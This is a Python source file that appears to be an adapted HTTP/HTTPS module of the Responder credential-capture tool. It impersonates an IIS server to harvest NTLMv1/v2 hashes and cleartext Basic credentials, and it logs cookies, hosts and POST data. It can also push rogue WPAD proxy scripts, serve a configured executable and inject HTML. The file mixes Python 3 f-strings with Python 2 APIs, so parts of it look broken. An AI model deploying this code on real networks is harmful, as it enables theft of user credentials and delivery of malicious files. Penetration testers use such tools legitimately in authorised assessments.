from SocketServer import BaseRequestHandler, StreamRequestHandler
from base64 import b64decode
import struct
from utils import *
from packets import NTLM_Challenge
from packets import IIS_Auth_401_Ans, IIS_Auth_Granted, IIS_NTLM_Challenge_Ans, IIS_Basic_401_Ans
from packets import WPADScript, ServeExeFile, ServeHtmlFile

# This variable will collect all the output for HTML rendering
output_data = []

# Parse NTLMv1/v2 hash.
def ParseHTTPHash(data, client):
    LMhashLen = struct.unpack('<H', data[12:14])[0]
    LMhashOffset = struct.unpack('<H', data[16:18])[0]
    LMHash = data[LMhashOffset:LMhashOffset + LMhashLen].encode("hex").upper()

    NthashLen = struct.unpack('<H', data[20:22])[0]
    NthashOffset = struct.unpack('<H', data[24:26])[0]
    NTHash = data[NthashOffset:NthashOffset + NthashLen].encode("hex").upper()

    UserLen = struct.unpack('<H', data[36:38])[0]
    UserOffset = struct.unpack('<H', data[40:42])[0]
    User = data[UserOffset:UserOffset + UserLen].replace('\x00', '')

    if NthashLen == 24:
        HostNameLen = struct.unpack('<H', data[46:48])[0]
        HostNameOffset = struct.unpack('<H', data[48:50])[0]
        HostName = data[HostNameOffset:HostNameOffset + HostNameLen].replace('\x00', '')
        WriteHash = f'{User}::{HostName}:{LMHash}:{NTHash}:{settings.Config.NumChal}'

        SaveToDb({
            'module': 'HTTP',
            'type': 'NTLMv1',
            'client': client,
            'host': HostName,
            'user': User,
            'hash': f'{LMHash}:{NTHash}',
            'fullhash': WriteHash,
        })
        output_data.append(f'[HTTP] NTLMv1 hash captured: {WriteHash}')

    if NthashLen > 24:
        NthashLen = 64
        DomainLen = struct.unpack('<H', data[28:30])[0]
        DomainOffset = struct.unpack('<H', data[32:34])[0]
        Domain = data[DomainOffset:DomainOffset + DomainLen].replace('\x00', '')
        HostNameLen = struct.unpack('<H', data[44:46])[0]
        HostNameOffset = struct.unpack('<H', data[48:50])[0]
        HostName = data[HostNameOffset:HostNameOffset + HostNameLen].replace('\x00', '')
        WriteHash = f'{User}::{Domain}:{settings.Config.NumChal}:{NTHash[:32]}:{NTHash[32:]}'

        SaveToDb({
            'module': 'HTTP',
            'type': 'NTLMv2',
            'client': client,
            'host': HostName,
            'user': f'{Domain}\\{User}',
            'hash': f'{NTHash[:32]}:{NTHash[32:]}',
            'fullhash': WriteHash,
        })
        output_data.append(f'[HTTP] NTLMv2 hash captured: {WriteHash}')


def GrabCookie(data):
    Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)
    if Cookie:
        Cookie = Cookie.group(0).replace('Cookie: ', '')
        if len(Cookie) > 1 and settings.Config.Verbose:
            output_data.append(f'[HTTP] Cookie: {Cookie}')
        return Cookie
    return False


def GrabHost(data):
    Host = re.search(r'(Host:*.\=*)[^\r\n]*', data)
    if Host:
        Host = Host.group(0).replace('Host: ', '')
        if settings.Config.Verbose:
            output_data.append(f'[HTTP] Host: {Host}')
        return Host
    return False


def GrabReferer(data):
    Referer = re.search(r'(Referer:*.\=*)[^\r\n]*', data)
    if Referer:
        Referer = Referer.group(0).replace('Referer: ', '')
        if settings.Config.Verbose:
            output_data.append(f'[HTTP] Referer: {Referer}')
        return Referer
    return False


def WpadCustom(data):
    Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
    if Wpad:
        Buffer = WPADScript(Payload=settings.Config.WPAD_Script)
        Buffer.calculate()
        return str(Buffer)
    return False


def ServeFile(Filename):
    with open(Filename, "rb") as bk:
        return bk.read()


def RespondWithFile(client, filename, dlname=None):
    if filename.endswith('.exe'):
        Buffer = ServeExeFile(Payload=ServeFile(filename), ContentDiFile=dlname)
    else:
        Buffer = ServeHtmlFile(Payload=ServeFile(filename))

    Buffer.calculate()
    output_data.append(f"[HTTP] Sending file {filename} to {client}")
    return str(Buffer)


def GrabURL(data, client):
    GET = re.findall(r'(?<=GET )[^HTTP]*', data)
    POST = re.findall(r'(?<=POST )[^HTTP]*', data)
    POSTDATA = re.findall(r'(?<=\r\n\r\n)[^*]*', data)

    if GET and settings.Config.Verbose:
        output_data.append(f'[HTTP] GET request from: {client}  URL: {"".join(GET)}')

    if POST and settings.Config.Verbose:
        output_data.append(f'[HTTP] POST request from: {client}  URL: {"".join(POST)}')
        if len(''.join(POSTDATA)) > 2:
            output_data.append(f'[HTTP] POST Data: {"".join(POSTDATA).strip()}')


def PacketSequence(data, client):
    NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
    Basic_Auth = re.findall(r'(?<=Authorization: Basic )[^\r]*', data)

    # Serve the .exe if needed
    if settings.Config.Serve_Always or (settings.Config.Serve_Exe and re.findall('.exe', data)):
        return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)

    # Serve the custom HTML if needed
    if settings.Config.Serve_Html:
        return RespondWithFile(client, settings.Config.Html_Filename)

    WPAD_Custom = WpadCustom(data)

    if NTLM_Auth:
        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]

        if Packet_NTLM == "\x01":
            GrabURL(data, client)
            GrabReferer(data)
            GrabHost(data)
            GrabCookie(data)

            Buffer = NTLM_Challenge(ServerChallenge=settings.Config.Challenge)
            Buffer.calculate()

            Buffer_Ans = IIS_NTLM_Challenge_Ans()
            Buffer_Ans.calculate(str(Buffer))

            return str(Buffer_Ans)

        if Packet_NTLM == "\x03":
            NTLM_Auth = b64decode(''.join(NTLM_Auth))
            ParseHTTPHash(NTLM_Auth, client)

            if settings.Config.Force_WPAD_Auth and WPAD_Custom:
                output_data.append(f'[HTTP] WPAD (auth) file sent to {client}')
                return WPAD_Custom
            else:
                Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
                Buffer.calculate()
                return str(Buffer)

    elif Basic_Auth:
        ClearText_Auth = b64decode(''.join(Basic_Auth))

        GrabURL(data, client)
        GrabReferer(data)
        GrabHost(data)
        GrabCookie(data)

        SaveToDb({
            'module': 'HTTP',
            'type': 'Basic',
            'client': client,
            'user': ClearText_Auth.split(':')[0],
            'cleartext': ClearText_Auth.split(':')[1],
        })

        if settings.Config.Force_WPAD_Auth and WPAD_Custom:
            if settings.Config.Verbose:
                output_data.append(f'[HTTP] WPAD (auth) file sent to {client}')
            return WPAD_Custom
        else:
            Buffer = IIS_Auth_Granted(Payload=settings.Config.HtmlToInject)
            Buffer.calculate()
            return str(Buffer)

    else:
        if settings.Config.Basic:
            Response = IIS_Basic_401_Ans()
            if settings.Config.Verbose:
                output_data.append(f'[HTTP] Sending BASIC authentication request to {client}')
        else:
            Response = IIS_Auth_401_Ans()
            if settings.Config.Verbose:
                output_data.append(f'[HTTP] Sending NTLM authentication request to {client}')
        return str(Response)


# HTTP Server class
class HTTP(BaseRequestHandler):
    def handle(self):
        global output_data
        output_data = []  # Clear previous data

        try:
            while True:
                self.request.settimeout(1)
                data = self.request.recv(8092)
                Buffer = WpadCustom(data)

                if Buffer and not settings.Config.Force_WPAD_Auth:
                    self.request.send(Buffer)
                    output_data.append(f'[HTTP] WPAD (no auth) file sent to {self.client_address[0]}')
                else:
                    Buffer = PacketSequence(data, self.client_address[0])
                    self.request.send(Buffer)

        except socket.error:
            pass

        return output_data  # Return collected data


# HTTPS Server class
class HTTPS(StreamRequestHandler):
    def setup(self):
        self.exchange = self.request
        self.rfile = socket._fileobject(self.request, "rb", self.rbufsize)
        self.wfile = socket._fileobject(self.request, "wb", self.wbufsize)

    def handle(self):
        global output_data
        output_data = []  # Clear previous data

        try:
            while True:
                data = self.exchange.recv(8092)
                self.exchange.settimeout(0.5)
                Buffer = WpadCustom(data)

                if Buffer and not settings.Config.Force_WPAD_Auth:
                    self.exchange.send(Buffer)
                    output_data.append(f'[HTTPS] WPAD (no auth) file sent to {self.client_address[0]}')
                else:
                    Buffer = PacketSequence(data, self.client_address[0])
                    self.exchange.send(Buffer)

        except:
            pass

        return output_data  # Return collected data